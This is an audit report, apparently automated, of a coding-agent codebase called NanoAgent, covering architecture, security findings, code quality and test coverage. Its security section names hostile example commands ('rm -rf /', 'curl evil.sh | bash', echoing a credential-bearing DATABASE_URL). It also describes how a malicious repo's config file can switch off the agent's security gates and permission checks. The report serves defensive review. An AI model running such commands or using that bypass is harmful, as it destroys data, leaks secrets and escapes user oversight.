# NanoAgent Codebase Audit Report

> Historical audit snapshot captured before the v2.7.8 fixes. Its findings and
> test-count claims describe the pre-fix tree; use the v2.7.8 release notes and
> CI results for the current state.

**Date:** 2026-09-22
**Version reviewed:** v2.7.7 (commit `6d78fbe`)
**Scope:** Full audit — architecture, security, code quality, test suite
**Codebase size:** ~35,400 lines of source (137 files), ~15,400 lines of tests (81 files), 12 runtime dependencies

---

## Executive Summary

NanoAgent is a well-structured, production-grade CLI/TUI coding agent optimized for small local models (2B–8B) with cloud scaling. The architecture is sound: clean separation between agent loop, LLM layer, providers, tools, security, and TUI. The security layer is layered and thoughtful, with strong path sandboxing, MCP trust guards, and output sanitization.

**Current state:** Typecheck passes clean. Test suite has **14 failures** (question-tool tests, pre-existing — see §5.2). 1101/1115 tests pass.

**Top findings by severity:**

| #   | Severity  | Finding                                                                               |
| --- | --------- | ------------------------------------------------------------------------------------- |
| 1   | Blocking  | Project-local `nanogent.json` can silently disable ALL security                       |
| 2   | Blocking  | `agentRun()` is a 1125-line monolith with duplicated streaming/non-streaming branches |
| 3   | Important | No default dangerous-command denylist (`rm -rf`, fork bombs)                          |
| 4   | Important | `change_workspace` bypasses path sandbox                                              |
| 5   | Important | Agent run loop and MCP trust guard have zero test coverage                            |
| 6   | Important | Entire TUI and CLI directories have no tests                                          |
| 7   | Important | Duplicated error-handling and tool-execution logic across multiple hot paths          |
| 8   | Important | Connection strings with embedded credentials pass to child processes                  |

---

## 1. Architecture Review

### 1.1 Agent Loop (`src/agent/core.ts`, `src/agent/run.ts`, `src/agent-*.ts`)

**Structure:** `AgentCore` (core.ts:54) is a thin orchestrator holding state (client, config, messages, todos, context manager, security manager, MCP manager). Module-level functions in `agent/run.ts`, `agent-lifecycle.ts`, `agent-messages.ts`, `agent-tools/execute.ts` take `agent` as first arg. This avoids a god-class while keeping a single mutable surface.

**Strengths:**

- Five independent loop guards: turn limit, stuck-loop via tool-call signature streak, all-duplicate round streak, per-turn tool-repeat blocking, reasoning-only streak with force-thinking-off escalation.
- Recovery mechanisms (not just termination): overflow retry, compaction-then-retry, failover, 5xx client rebuild, premature-checkin auto-continue. Each has its own cap.
- Streaming think-tag parser (run.ts:499–543) handles `<think>` blocks split across chunks with nested re-entry — robust for small models.
- Context manager uses O(1) incremental token accounting via `messageTokenCache` with dual-source tracking (API-reported vs local estimate, taking `max()`).

**Concerns:**

**[Blocking] `agentRun` is a monolith** — `src/agent/run.ts:44` is a single 1125-line function. The streaming branch (lines 420–743) and non-streaming branch (lines 831–1027) duplicate ~90% of their error-handling logic (overflow detection, failover, 5xx rebuild, 401 handling, reasoning-only). ~170 lines of near-identical catch blocks. Any guard added to one branch must be mirrored in the other, and the non-streaming branch already lags in subtle ways.

**[Important] Slash-command routing mixed into the LLM loop** — Lines 82–269 handle `/skill:`, `/unload`, `/subagents`, `/mcp`, `/mcp-add`, `/mcp-remove`, `/create-skill` inline. These synchronous short-circuits belong in a pre-loop dispatcher, not inside `agentRun`.

**[Important] `cfg.maxTokens` mutated mid-loop** — `run.ts:345` doubles `agent.cfg.maxTokens` during reasoning-only escalation up to 32768 and never resets. This side effect persists across compaction, failover, and profile switches, leaking into all subsequent `getMaxOutputTokens` calls.

**[Nit] `_compacting` guard** — `core.ts:169` uses a bare boolean with no timeout. If `llmCompactSummary` hangs, the guard never clears and all future compaction is silently skipped.

### 1.2 LLM Layer (`src/llm/`)

**Structure:** Clean module split — `client.ts` (OpenAI SDK wrapper), `stream.ts` (async generator + retry), `chat.ts` (non-streaming + retry), `request.ts` (param builder), `context.ts` (context window resolution + compaction settings), `utils.ts` (token counting, heuristics), `rate-limit.ts` (per-endpoint RPM/TPM/in-flight), `failover.ts`, `tool-call-parser.ts` (XML fallback), `overflow.ts`.

**Strengths:**

- Single param builder (`buildChatCompletionsParams`, request.ts:95) is the seam for `max_tokens` vs `max_completion_tokens`, `enable_thinking`, `reasoning_effort`, `prompt_cache_key`.
- Rate limiting is sophisticated and self-healing: leaky-bucket RPM with adaptive halving on 429, hysteresis on TPM, success-streak ramp-up, per-scope prompt-token caching, in-flight semaphore with capped waiter list.
- Tool-call argument merging (`mergeToolCallArgumentDelta`, stream.ts:144) handles streaming fragments correctly.

**Concerns:**

**[Important] `estimateModelContextSize` is a 160-line if-chain on model id substrings** (`context.ts:35`). Fragile: `qwen3-next`/`qwen3.5`/`qwen3-` map to 262144, bare `qwen3` falls through to 128000. New model ids silently get wrong windows. A lookup table keyed by normalized family would be more maintainable.

**[Important] `chat.ts` and `stream.ts` share ~80% identical retry/error logic** — both duplicate the `awaitEndpointTurn`/`releaseEndpointTurn`/`shouldRetry`/`noteEndpointRateLimited`/`errorMessage`/`calculateBackoffDelay` sequence. A shared `withEndpointRetry(fn)` wrapper would eliminate the duplication.

**[Important] `isLocalProvider`** (`utils.ts:27`) uses substring matching on the URL — `includes('foundry')` matches any URL containing "foundry", `includes('jan')` matches "january.example.com". Misclassifying a remote URL as local skips all rate limiting.

**[Nit] `shouldRetry`** (`rate-limit.ts:650`) retries status 400 up to 3 times. A genuine bad request burns 3 retries before surfacing.

### 1.3 Providers (`src/providers/`)

**Structure:** `catalog.ts` (static ~30+ provider array), `lookup.ts` (getProvider, API key resolution, rate limit resolution), `runtime.ts` (fetch local/remote/OpenRouter models, health check).

**Strengths:** `getProviderForBaseURL` uses longest-hostname-wins matching for disambiguation. `sanitizeBaseURL` strips credentials from URLs before logging.

**Concerns:**

**[Important] Catalog is a hand-maintained static array** — model lists go stale fast. The catalog serves UI listing, API-key env-var resolution, and rate-limit defaults, but model arrays aren't enforced anywhere. Real discovery is `fetchRemoteModels`/`fetchOpenRouterModels`.

### 1.4 Subagents (`src/subagents/`)

**Structure:** `pool.ts` (LM Studio discovery), `scheduler.ts` (endpoint-slot acquisition), `worker/context.ts` (per-dispatch Config clone), `worker/loop.ts` (worker LLM loop), `worker/tool-runner.ts` (restricted tools), `worker/failover.ts` (in-memory failover).

**Strengths:** Worker isolation is clean — `buildWorkerContext` clones Config, creates independent SecurityManager/ToolCacheManager/OpenAI client. Failover mutates `wctx.cfg` in memory only. Scheduler has 60s timeout to prevent indefinite waiting.

**Concerns:**

**[Important] Worker loop is 540 lines** with inline tool-result logic (`worker/loop.ts:288–462`). A single `Promise.all` callback contains ~170 lines of duplicate-blocking, budget-checking, and emit logic.

**[Important] System prompt says "DO NOT call list_dir" but the tool set includes `list_dir`** (`worker/loop.ts:17`). A 2B model will sometimes call it anyway. Filtering the tool set to match the prompt would be more reliable.

### 1.5 Tools (`src/tools/`, `src/agent-tools/`)

**Structure:** `registry.ts` (tool array, OpenAI conversion, parallel/sequential classification), `shared.ts` (Tool interface, `safe()` sandbox), `file-tools/`, `search-tools.ts`, `git-tools.ts`, `exec-tools.ts`, `graph-tools.ts`, `question-tool.ts`, `mcp-manage.ts`, `cache.ts` (fs.watch invalidation).

**Strengths:** Parallel/sequential classification is a clean static partition. Tool cache with `fs.watch` invalidation is smart for avoiding stale reads. The `question` tool's prose-promotion fallback (`maybePromoteProseQuestion`) compensates for small models not calling the tool directly.

**Concerns:**

**[Important] `executeToolSequential` and `executeToolsParallel`** (`agent-tools/execute.ts`) share ~60% identical code — permission check, repeat-block check, cache lookup, `executeAsync` with synthetic sub-agent hooks, sanitize, cache store, `addToolMessage`. The synthetic sub-agent hook block is copy-pasted at execute.ts:170–222 and 403–449.

**[Important] `questionTool` uses module-level mutable state** — `_pendingResolver`, `_pendingQuestions`, `_activeController` are global singletons. Two concurrent question calls would clobber each other.

**[Nit] `findTool`** (`registry.ts:295`) is a linear scan over all tools on every call. A `Map<string, Tool>` would be O(1).

**[Nit] `SMALL_MODEL_EXCLUDED`** (`registry.ts:122`) drops `grep_search`, `batch_read_files`, `map_project_tree`, and all 13 graph tools for ≤8B models. The binary threshold at `smallModelMode` doesn't distinguish 2B from 8B.

### 1.6 TUI (`src/opentui/`)

**Structure:** `app-store.ts` (zustand store), `app.tsx` (1290 lines, main app), `chat-screen.tsx` (1413 lines, chat panel), overlays, status bar, slash commands, theme.

**Strengths:** `syncFromAgent` (app-store.ts:295) is the single bridge from AgentCore to the store, cloning the in-flight tail message to force React re-render. Message queue with 3-retry limit and 20-message cap prevents unbounded growth. No blocking I/O on render paths.

**Concerns:**

**[Important] `chat-screen.tsx` and `app.tsx` are very large** (1413 and 1290 lines). The chat screen has inline markdown parsing, code block handling, diff rendering, and tool display in one file.

**[Important] `syncFromAgent` clones the entire messages array on every call** (`[...msgs]`). For long sessions (hundreds of messages), this is O(n) per render tick.

### 1.7 Config (`src/config/`)

**Structure:** `paths.ts` (single source of truth for FS paths), `load.ts` (678 lines, env+file merge, trust scrubbing, validation), `defaults.ts`, `validate.ts`, `api-keys.ts`, `profiles.ts`, `effort.ts`.

**Strengths:** `paths.ts` is exemplary — single canonical root, no homedir/cwd/legacy fallbacks, fail-fast boot check, cached and validated. The `.env` trust model is correct: trusted canonical `.env` loaded first, untrusted workspace `.env` second, trust-sensitive keys scrubbed after merge, `REAL_ENV` snapshot at module load.

**Concerns:**

**[Important] `loadConfig` is 400 lines** (`load.ts:240–638`) with ~30 `if (process.env.QWEN_*)` blocks for env-var overrides. A declarative schema (env-var name → config key → parser → range) would cut this to ~50 lines.

**[Important] Config is a single flat object with ~60 fields** — no nesting. Grouping into `config.security.*`, `config.context.*`, `config.rateLimit.*` would improve readability.

### 1.8 Context Manager (`src/context/manager.ts`, `src/context/summarize.ts`)

**Strengths:** Dual-source token tracking prevents stale LM Studio reports. O(1) incremental accounting. Compaction preserves system-base + original user task (correct shape for Qwen Jinja).

**Concerns:**

**[Important] `compact()` ignores `keepCount` and `targetRatio`** (`manager.ts:479`) — current implementation is all-or-nothing: keep system + original user, summarize the rest. No partial compaction means every compaction is a full history wipe with a single summary.

**[Important] `llmCompactSummary`** (`summarize.ts:21`) sends the full history (that triggered compaction at 80%) as input to the summarization call. Some providers will reject this with context-length error. The fallback is a crude file-list + 5 truncated notes.

---

## 2. Security Review

### 2.1 Trust Model Overview

Six layers of defense:

1. **Path sandbox** (`shared.ts:safe()`) — `realpathSync` + prefix check, blocks workspace escape
2. **File blocklist** (`SecurityManager.validateFileAccess`) — `.env`, `.ssh`, `*.pem`, `.git/`
3. **Permission gate** (`PermissionManager`) — ask/allow/read_only modes per tool category
4. **Output sanitization** (`SecurityManager.sanitizeOutput`) — redacts API keys, tokens, private keys
5. **MCP trust guard** (`agent-lifecycle.ts`) — project-local MCP configs blocked from auto-connect
6. **Env trust** (`config/load.ts`) — workspace `.env` scrubbed of trust-sensitive vars

### 2.2 Findings

**[Blocking] Project-local `nanogent.json` can silently disable all security**
`src/config/load.ts:306–323`

Only `mcp` is stripped from the project-local config. Every other field is `Object.assign`ed directly into `cfg`, including `securityEnabled`, `permissionMode`, `securityBlockedPaths`, `securityValidateFileAccess`. A cloned repo with `nanogent.json` containing `{ "securityEnabled": false, "permissionMode": "always_allow" }` silently disables all security gates when opened with `--workspace`.

**Fix:** Strip security fields from project-local configs the same way `mcp` is stripped:

```typescript
const SECURITY_FIELDS = new Set([
  'securityEnabled',
  'securityValidateCommands',
  'securityValidateFileAccess',
  'securitySanitizeOutput',
  'securityMaxFileSize',
  'securityMaxBatchFiles',
  'securityAllowedPaths',
  'securityBlockedPaths',
  'permissionMode',
  'permissionRules',
]);
```

**[Important] No default dangerous-command denylist**
`src/security/index.ts:129–162`

`blockedCommands` defaults to `[]`. The only gate is `PermissionManager` mode. In `always_allow` mode, the model can run `rm -rf /`, `curl evil.sh | bash`, or exfiltrate files with zero friction. A minimal default denylist for universally destructive patterns would add defense-in-depth.

**[Important] `change_workspace` bypasses path sandbox**
`src/tools/file-tools/navigate.ts:23–45`

Unlike every other file tool, `change_workspace` does NOT call `safe()`. The model can change workspace to any directory (`/`, `C:\`, `/etc`). After the switch, that directory becomes the new sandbox. Combined with the blocking finding above, a malicious repo could enable unrestricted filesystem access.

**[Important] Connection strings with embedded credentials pass to child processes**
`src/tools/shared.ts:116–167`

`SENSITIVE_ENV_PATTERNS` only checks env var names, not values. `DATABASE_URL=postgres://user:secretpass@host/db` passes through because `DATABASE_URL` matches no pattern. The model can exfiltrate it via `echo $DATABASE_URL`.

**[Important] Sub-agent tool output not sanitized with active API key**
`src/subagents/worker/tool-runner.ts:105`

The main agent passes `agent.cfg.apiKey` to `sanitizeOutput`. The sub-agent worker does not — only generic patterns (`sk-*`, `or-*`) are redacted. The main agent's API key could leak via a sub-agent `read_file` of a config file.

**[Important] AWS 40-char base64 regex over-redacts legitimate content**
`src/security/index.ts:417–422`

The generic 40-char alphanumeric matcher redacts legitimate base64 content, SHA-1 hashes, and code identifiers. Too broad — should be narrowed to AWS-specific patterns.

**[Nit] `safe()` Windows drive regex inconsistent** (`shared.ts:217`) — matches `C:/` but not `C:\`.
**[Nit] `getSanitizedEnv` over-strips `AUTH`-containing names** (`shared.ts:122`) — `AUTHOR`, `AUTHORS` are stripped.
**[Nit] `question` tool answer returned to model** — social engineering surface inherent to any question tool.

### 2.3 What's Done Well

- **MCP trust guard** (`agent-lifecycle.ts:221–273`): Per-server trust split with `mcpUntrusted` tracking, `NANOGENT_TRUST_PROJECT_MCP` read from `REAL_ENV`. Solid.
- **Workspace `.env` untrusted enforcement** (`config/load.ts:79–104`): Trust-sensitive vars scrubbed, `REAL_ENV` captured at import time. Correct.
- **`getApiKey`** (`config/api-keys.ts:83–106`): Only reads from `process.env` and canonical `config/.env`. Never from workspace `.env`.
- **Path sandbox with symlink resolution** (`shared.ts:safe()`): Uses `realpathSync`, handles non-existent paths by walking to nearest existing ancestor.
- **ReDoS guard** (`shared.ts:validateSearchPattern`): Blocks nested quantifiers before model-supplied regex hits the engine.
- **`sanitizedBaseEnv` for MCP servers** (`mcp/index.ts:205–213`): Strips secrets from spawned MCP server environments.
- **`{file:path}` interpolation guard** (`mcp/index.ts:27–53`): Resolves symlinks, checks workspace boundary before reading.

---

## 3. Code Quality Review

### 3.1 Type Safety

**[Important] `any` in Tool interface** — `src/tools/shared.ts:17,21` uses `args: any` with explicit eslint-disable comments. Every tool implementation inherits this. `Record<string, unknown>` would be safer.

**[Nit] Repeated `as Record<string, unknown>` error casts** — Duplicated 5+ times across `agent/run.ts:745`, `llm/chat.ts:118`, `llm/stream.ts:202`, `llm/failover.ts:24`. `llm/failover.ts` already exports `httpStatusOf()` and `isAbortError()` — the run loop should use those.

**[Nit] `as never` on skill entries** — `agent-lifecycle.ts:338` uses a type escape hatch. The `SkillManager.activeSkills` Map value type should be fixed.

### 3.2 Error Handling

**Strength:** Agent-loop errors correctly return structured tool-error messages (`{ ok: false, error: ... }`), not thrown exceptions. LLM errors are thrown as `ApiError`, caught in the run loop with structured fallback handling.

**[Important] Empty catch blocks** — 13 empty/silent catch blocks across `agent-tools/utils.ts`, `agent-tools/execute.ts`, `agent-lifecycle.ts`, `mcp/index.ts`, `store.ts`. Most are genuinely best-effort, but 3 `JSON.parse` catch blocks in `utils.ts` silently swallow parse failures with no trace.

**[Nit] Fire-and-forget with `.catch(() => {})` on shutdown** — `app.tsx:198` silently eats shutdown errors.

### 3.3 Async Discipline

**Strength:** No blocking I/O on TUI render paths. `setInterval` for timers, debounced session save with cleanup, `void` prefix on fire-and-forget IIFEs.

**[Important] Missing `await` on `takeBaselineSnapshot`** — `agent-tools/utils.ts:81`, `agent-lifecycle.ts:293,440`. If the function is async, the baseline could be incomplete when the agent starts editing. If it's actually synchronous, the missing `await` is misleading.

### 3.4 Code Conventions

**Strength:** ESM/NodeNext imports correct (relative imports use `.js`). Consistent kebab-case file naming. No commented-out code.

**[Important] Duplicate error-handling blocks in `agent/run.ts`** — Lines 744–830 (streaming, 87 lines) and 850–930 (non-streaming, 81 lines) are near-identical. ~170 lines of duplicated logic.

**[Important] Duplicate synthetic sub-agent hook construction** — `agent-tools/execute.ts:170–222` (sequential, 52 lines) and 406–449 (parallel, 43 lines) copy the same `onSubAgentProgress` hook logic.

**[Nit] Unicode mojibake in comments** — `agent-lifecycle.ts:217,374,361` has `â€"` (should be `—`) and `Â·` (should be `·`). File encoding issue.

### 3.5 Complexity Hotspots

| File                       | Lines | Concern                                               |
| -------------------------- | ----- | ----------------------------------------------------- |
| `opentui/chat-screen.tsx`  | 1413  | Large render module, inline parsing/diff/tool display |
| `opentui/app.tsx`          | 1290  | Large app component                                   |
| `agent/run.ts`             | 1125  | Monolithic `agentRun()` function                      |
| `config/load.ts`           | 678   | 30+ imperative env-var blocks                         |
| `context/manager.ts`       | 638   | All-or-nothing compaction                             |
| `subagents/worker/loop.ts` | 594   | 483-line `runSingleSubAgent`                          |

### 3.6 Dead Code

**[Important] `agent-subagents.ts`** — Entire module (200+ lines) marked `@deprecated`. Background spawn/await machinery is dead code kept for API compatibility. `AgentCore.spawnBackgroundSubAgent` and `AgentCore.awaitAllBackgroundSubAgents` still expose it.

**[Nit] Dead aliases** — `compactContextIfNeeded` (core.ts:328), `getBackgroundSubAgents` (core.ts:204) — simple wrappers with no visible callers.

### 3.7 Dependency Footprint

All 12 runtime dependencies are justified. Two suggestions:

**[Suggestion] `tiktoken`** — The heaviest runtime dep (WASM tokenizer). Used only for token estimation with a `text.length / 4` fallback already in place. Consider making it an optional dependency.

**[Suggestion] `@openrouter/sdk`** — Listed as runtime but the codebase uses the `openai` SDK for all Chat Completions (including OpenRouter via `baseURL`). May only be used for catalog/model fetching — could be lazy-loaded.

---

## 4. Test Suite Review

### 4.1 Current State

- **1101 pass, 14 fail** out of 1115 tests across 82 files
- Typecheck: clean
- The 14 failures are all in `src/tools/question-tool.test.ts` (pre-existing)

### 4.2 Pre-existing Test Failures

**14 failures in `question-tool.test.ts`** — Tests call `questionTool.executeAsync` expecting `resolveQuestion`/`cancelQuestion` to work, but the implementation checks for `globalThis.__questionToolNotify` at line 211–218 and returns early with "Question tool is unavailable outside the interactive TUI" when no TUI resolver is set. The test `beforeEach` doesn't set up the mock resolver.

**Fix:** Add to `beforeEach`:

```typescript
(globalThis as Record<string, unknown>)['__questionToolNotify'] = () => {};
```

And clean up in `afterEach`:

```typescript
delete (globalThis as Record<string, unknown>)['__questionToolNotify'];
```

### 4.3 Coverage Map

**Well-tested areas (28 source files with tests):**

| Area                                                                                     | Test files            | Quality                                                                                                    |
| ---------------------------------------------------------------------------------------- | --------------------- | ---------------------------------------------------------------------------------------------------------- |
| Security (`security/index.ts`, `permissions.ts`)                                         | 2 files, 40+ cases    | Excellent — command validation, path sandbox, secret sanitization, `.env`/`.git` blocking, glob corruption |
| Providers (`providers/`, `model-runtime.ts`)                                             | 2 files, 600+ lines   | Good — fetch mocking, health checks, model resolution                                                      |
| LLM internals (`failover`, `overflow`, `tool-call-parser`, `tool-result-budget`, `cost`) | 5 files               | Good — retry, rate limit, backoff, cost estimation                                                         |
| Storage (`store.ts`, `snapshots.ts`, `workspace-history.ts`)                             | 3 files               | Good — real filesystem fixtures, session persistence                                                       |
| Tools (`tools/index.ts`, `file-tools/write.ts`)                                          | 2 files, 580+ lines   | Good — git operations, file editing, CRLF, fuzzy matching                                                  |
| Subagents (`subagents/`)                                                                 | 1 file + worker tests | Good — pool resolution, worker context, failover                                                           |
| Config (`config.test.ts`, `effort`, `profiles`, `api-keys`)                              | 4 files               | Moderate — config loading, profiles, effort levels                                                         |
| Agent helpers (`agent-todos`, `agent-messages`, `early-stop`, `tool-repeat`)             | 4 files               | Moderate — small focused unit tests                                                                        |

**Critical untested areas:**

| Area                        | Risk      | Why it matters                                                                                       |
| --------------------------- | --------- | ---------------------------------------------------------------------------------------------------- |
| `src/agent/run.ts`          | Blocking  | Core agent run loop — LLM call → tool dispatch → loop. Zero coverage of the most critical code path. |
| `src/mcp/` (trust guard)    | Blocking  | The RCE/key-exfil guard has no test verifying project-local configs are blocked.                     |
| `src/context/manager.ts`    | Important | Compaction logic — `checkAndCompactContext` not tested.                                              |
| `src/opentui/` (entire dir) | Important | TUI is the primary interface — zero test files.                                                      |
| `src/cli/` (entire dir)     | Important | Headless CLI — zero test files.                                                                      |
| `src/main.ts`               | Important | CLI entry point, signal handling — zero tests.                                                       |
| `src/agent-lifecycle.ts`    | Important | Init, reconfigure, shutdown — zero tests.                                                            |
| `src/graph/`                | Nit       | Memory graph — zero tests.                                                                           |

### 4.4 Test Quality

**Strengths:**

- Test names describe behavior: `'blocks re-reading the same path with the same args'`, `'does not mistake MoMoE architecture tags for param sizes'`
- Real filesystem fixtures with `mkdtempSync` + cleanup in `store.test.ts`, `snapshots.test.ts`, `workspace-history.test.ts`, `tools/index.test.ts`
- Proper env var save/restore in `providers.test.ts`, `failover.test.ts`, `subagents.test.ts`
- Good edge case coverage: empty inputs, path traversal (`../../etc/passwd`), null/undefined, large inputs (40k chars), unreachable endpoints, timeout handling, CRLF

**Weaknesses:**

- `agent.test.ts` tests are shallow — constructor property assertions, not behavior. "Error Handling" test just verifies the constructor doesn't throw.
- `integration.test.ts` is misnamed — tests `groupToolsForParallelExecution` in isolation, no end-to-end agent run with mocked LLM.
- `tests/` directory referenced by AGENTS.md is empty.
- No shared test helpers — fixture boilerplate duplicated.

### 4.5 Brittle Tests

- `llm.test.ts:189–196` — timing-dependent rate limit test using real wall-clock (`Date.now()`). Low flake risk but technically fragile.
- `tools/index.test.ts:9` — uses `Date.now()` for tmp dir uniqueness instead of `mkdtempSync`. Collision possible under parallel CI.
- `tools/index.test.ts:173` — git tests use `execSync('git init')` without guarding for missing `git` binary (unlike the `bun` test which guards).
- `snapshots.test.ts:225` — chmod test silently `return`s on Windows (counts as pass) instead of using `it.skip()`.

---

## 5. Cross-Cutting Findings

### 5.1 Most Impactful Refactors (Ranked)

1. **Split `agentRun` into streaming/non-streaming + shared error recovery** — eliminates ~200 lines of duplication, the biggest maintenance risk.
2. **Extract `runOneToolCall` from `executeToolSequential`/`executeToolsParallel`** — eliminates ~200 lines of copy-pasted permission/cache/sanitize logic.
3. **Strip security fields from project-local `nanogent.json`** — fixes the blocking security finding.
4. **Declarative env-var schema in `loadConfig`** — replaces 30 imperative blocks with a table-driven approach.
5. **Replace `estimateModelContextSize` if-chain with a lookup table** — makes context estimation testable.
6. **Move slash-command routing out of `agentRun`** — into a pre-loop dispatcher.

### 5.2 Dependency Graph

No actual runtime cycles, but barrel files (`agent.ts`, `llm.ts`, `subagents.ts`, `config.ts`, `providers.ts`) create import indirection. Type-only imports through barrels compile correctly under ESM but make the dependency graph hard to follow.

### 5.3 Missing Tests — Priority Order

1. MCP trust guard (security-critical, RCE prevention)
2. Agent run loop with mocked LLM (core behavior)
3. Context compaction trigger and summary generation
4. `change_workspace` path validation
5. Project-local config security field stripping (once implemented)

---

## 6. Summary Scorecard

| Domain                   | Rating                     | Notes                                                                                            |
| ------------------------ | -------------------------- | ------------------------------------------------------------------------------------------------ |
| **Architecture**         | Good                       | Clean separation, thoughtful state management. Monolithic `agentRun` is the main debt.           |
| **Security**             | Good with one critical gap | MCP trust guard and env trust model are solid. Project-local config security bypass is blocking. |
| **Type safety**          | Good                       | Strict mode, minimal `any`. Tool interface `any` and repeated error casts are the main issues.   |
| **Error handling**       | Good                       | Structured tool errors, caught LLM errors. Empty catch blocks overused.                          |
| **Async discipline**     | Good                       | No blocking I/O on render paths. Missing `await` on snapshots.                                   |
| **Code conventions**     | Good                       | Consistent ESM, naming, style. Duplicated hot-path logic is the main issue.                      |
| **Test coverage**        | Moderate                   | Tested areas are well done. Critical gaps in agent loop, MCP trust guard, TUI, CLI.              |
| **Dependency footprint** | Good                       | 12 runtime deps, all justified. `tiktoken` could be optional.                                    |

---

_Generated by Mistral Vibe. Based on automated codebase exploration and manual file review._
